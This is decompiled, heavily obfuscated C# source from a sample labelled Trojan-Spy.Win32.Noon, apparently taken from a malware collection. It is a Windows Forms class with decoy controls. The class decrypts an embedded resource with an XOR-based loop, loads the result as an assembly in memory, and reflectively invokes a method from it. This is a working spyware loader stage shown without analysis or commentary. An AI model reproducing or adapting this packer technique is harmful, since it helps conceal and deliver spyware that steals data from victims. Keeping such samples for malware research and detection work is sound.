// Decompiled with JetBrains decompiler
// Type:  
// Assembly: ProgIdRedirectionEn, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B81F1514-ABAD-442F-0D6D-30821B04B8DB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcqy-84d399a3116d4038d5730fdbae6857142c0141f042dbba9a42e8a21e1ce6448b.exe

using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

public sealed class \u0005\u2005 : Form
{
  private IContainer \u0002;
  private static object \u0003;
  private ListBox \u0005;
  private RichTextBox \u0008;
  private CheckedListBox \u0006;
  private MonthCalendar \u000E;
  private MonthCalendar \u000F;
  private CheckedListBox \u0002\u2000;
  private RichTextBox \u0003\u2000;
  private ListBox \u0005\u2000;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0005\u2005()
  {
    int num1 = 2;
    if (\u0005\u2005.\u0002())
      goto label_5;
label_1:
    \u0003\u2004.\u0002();
    num1 = 5;
label_5:
    while (true)
    {
      string[] parameters;
      MethodInfo method;
      int num2;
      switch (num1)
      {
        case 0:
        case 2:
          goto label_1;
        case 1:
        case 5:
          this.\u0002 = (IContainer) null;
          if (!\u0005\u2005.\u0003())
          {
            num1 = 4;
            continue;
          }
          goto case 6;
        case 3:
          parameters[0] = \u0005\u2007.\u0002(-1359008296);
          parameters[1] = \u0005\u2007.\u0002(-1359008375);
          parameters[2] = \u0005\u2007.\u0002(-1359008412);
          method.Invoke((object) 0, (object[]) parameters);
          num1 = 7;
          continue;
        case 4:
          // ISSUE: explicit constructor call
          base.\u002Ector();
          this.\u0002();
          method = ((System.Type) \u0005\u2005.\u0003).GetMethod(\u0005\u2007.\u0002(-1359008405));
          goto case 6;
        case 6:
          parameters = new string[3];
          num2 = 3;
          break;
        case 7:
          goto label_9;
        default:
          num2 = 6;
          break;
      }
      num1 = num2;
    }
label_9:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  protected override void Dispose(bool _param1)
  {
    int num1 = 4;
    while (true)
    {
      int num2;
      int num3;
      switch (num1)
      {
        case 0:
        case 4:
          if (!_param1)
          {
            num3 = 0;
            break;
          }
          num2 = 3;
          goto label_5;
        case 1:
        case 3:
          num3 = this.\u0002 != null ? 1 : 0;
          break;
        case 2:
label_10:
          this.\u0002.Dispose();
          goto label_11;
        case 5:
          goto label_4;
        default:
          num2 = 2;
          goto label_5;
      }
      if (num3 == 0)
        goto label_11;
      else
        goto label_10;
label_5:
      num1 = num2;
      continue;
label_11:
      base.Dispose(_param1);
      if (\u0005\u2005.\u0002())
        num1 = 5;
      else
        goto label_12;
    }
label_4:
    return;
label_12:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0002()
  {
    int num1 = 7;
    while (true)
    {
      int num2;
      switch (num1)
      {
        case 0:
        case 7:
          this.\u0005 = new ListBox();
          num2 = 9;
          break;
        case 1:
          this.\u0008.Size = new Size(8, 8);
          this.\u0008.TabIndex = 1;
          this.\u0008.Text = string.Empty;
          this.\u0006.FormattingEnabled = true;
          this.\u0006.Location = new Point(552, 175);
          num2 = 3;
          break;
        case 2:
          this.\u0005.TabIndex = 0;
          this.\u0008.Location = new Point(301, 301);
          this.\u0008.Name = \u0005\u2007.\u0002(-1359008564);
          if (!\u0005\u2005.\u0003())
          {
            num1 = 1;
            continue;
          }
          goto case 17;
        case 3:
        case 4:
          this.\u0006.Name = \u0005\u2007.\u0002(-1359008465);
          if (!\u0005\u2005.\u0003())
          {
            num1 = 13;
            continue;
          }
          goto case 6;
        case 5:
          this.Controls.Add((Control) this.\u0005\u2000);
          num1 = 11;
          continue;
        case 6:
          this.Controls.Add((Control) this.\u0008);
          this.Controls.Add((Control) this.\u0005);
          this.Name = \u0005\u2007.\u0002(-1359009688);
          this.Text = \u0005\u2007.\u0002(-1359009688);
          this.ResumeLayout(false);
          num2 = 18;
          break;
        case 8:
          this.\u000E.Name = \u0005\u2007.\u0002(-1359008443);
          this.\u000E.TabIndex = 3;
          this.\u000F.Location = new Point(130, 118);
          this.\u000F.Name = \u0005\u2007.\u0002(-1359008430);
          this.\u000F.TabIndex = 7;
          this.\u0002\u2000.FormattingEnabled = true;
          if (\u0005\u2005.\u0002())
          {
            num1 = 15;
            continue;
          }
          goto case 14;
        case 9:
          this.\u0008 = new RichTextBox();
          this.\u0006 = new CheckedListBox();
          this.\u000E = new MonthCalendar();
          this.\u000F = new MonthCalendar();
          this.\u0002\u2000 = new CheckedListBox();
          this.\u0003\u2000 = new RichTextBox();
          this.\u0005\u2000 = new ListBox();
          this.SuspendLayout();
          this.\u0005.FormattingEnabled = true;
          this.\u0005.Location = new Point(461, 118);
          this.\u0005.Name = \u0005\u2007.\u0002(-1359008515);
          this.\u0005.Size = new Size(8, 4);
          num2 = 2;
          break;
        case 10:
          this.Controls.Add((Control) this.\u0006);
          if (\u0005\u2005.\u0002())
          {
            num1 = 6;
            continue;
          }
          goto case 15;
        case 11:
          this.Controls.Add((Control) this.\u000E);
          if (\u0005\u2005.\u0002())
          {
            num1 = 10;
            continue;
          }
          goto case 9;
        case 12:
          this.\u0006.TabIndex = 2;
          this.\u000E.Location = new Point(132, 95);
          num2 = 8;
          break;
        case 13:
          this.\u0006.Size = new Size(120, 94);
          num2 = 12;
          break;
        case 14:
          this.AutoScaleDimensions = new SizeF(6f, 13f);
          this.AutoScaleMode = AutoScaleMode.Font;
          num2 = 17;
          break;
        case 15:
          this.\u0002\u2000.Location = new Point(550, 198);
          this.\u0002\u2000.Name = \u0005\u2007.\u0002(-1359008492);
          this.\u0002\u2000.Size = new Size(120, 94);
          this.\u0002\u2000.TabIndex = 6;
          this.\u0003\u2000.Location = new Point(299, 324);
          this.\u0003\u2000.Name = \u0005\u2007.\u0002(-1359008542);
          this.\u0003\u2000.Size = new Size(8, 8);
          this.\u0003\u2000.TabIndex = 5;
          this.\u0003\u2000.Text = string.Empty;
          this.\u0005\u2000.FormattingEnabled = true;
          goto case 16;
        case 16:
          this.\u0005\u2000.Location = new Point(459, 141);
          this.\u0005\u2000.Name = \u0005\u2007.\u0002(-1359008507);
          this.\u0005\u2000.Size = new Size(8, 4);
          this.\u0005\u2000.TabIndex = 4;
          num1 = 14;
          continue;
        case 17:
          this.ClientSize = new Size(800, 450);
          this.Controls.Add((Control) this.\u000F);
          this.Controls.Add((Control) this.\u0002\u2000);
          this.Controls.Add((Control) this.\u0003\u2000);
          if (\u0005\u2005.\u0002())
          {
            num1 = 5;
            continue;
          }
          goto label_20;
        case 18:
          goto label_21;
        default:
          num1 = 16;
          continue;
      }
      num1 = num2;
    }
label_21:
    return;
label_20:;
  }

  public override string Text
  {
    [MethodImpl(MethodImplOptions.NoInlining)] get => base.Text;
    [MethodImpl(MethodImplOptions.NoInlining)] set => \u0005\u2005.\u0002();
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static string \u0002()
  {
    int num1 = 6;
    string str1;
    while (true)
    {
      bool flag;
      byte[] rawAssembly;
      string str2;
      int num2;
      int num3;
      ResourceManager resourceManager;
      switch (num1)
      {
        case 0:
        case 6:
          resourceManager = new ResourceManager(typeof (\u000E\u2000));
          num2 = 1;
          break;
        case 1:
          rawAssembly = (byte[]) resourceManager.GetObject(\u0005\u2007.\u0002(-1359008545));
          if (\u0005\u2005.\u0002())
          {
            num1 = 5;
            continue;
          }
          goto case 2;
        case 2:
        case 5:
          str2 = \u0005\u2007.\u0002(-1359008605);
          num3 = 92182;
          goto case 3;
        case 3:
          flag = num3 >= 0;
          num2 = 4;
          break;
        case 4:
          if (!flag)
          {
            \u0005\u2005.\u0002(Assembly.Load(rawAssembly), 11);
            str1 = str2;
            num2 = 7;
            break;
          }
          rawAssembly[num3 % 46080] = (byte) ((((int) rawAssembly[num3 % 46080] ^ (int) str2[num3 % 22]) - (int) rawAssembly[(num3 + 1) % 46080] + 256) % 256);
          num3 += -1;
          goto case 3;
        case 7:
          goto label_12;
        default:
          int num4 = 3;
          num1 = \u0005\u2005.\u0003() ? num4 : num4;
          continue;
      }
      num1 = num2;
    }
label_12:
    return str1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static void \u0002(Assembly _param0, int _param1) => \u0005\u2005.\u0003 = (object) _param0.GetTypes()[_param1];

  internal static bool \u0002() => true;

  internal static bool \u0003() => false;
}
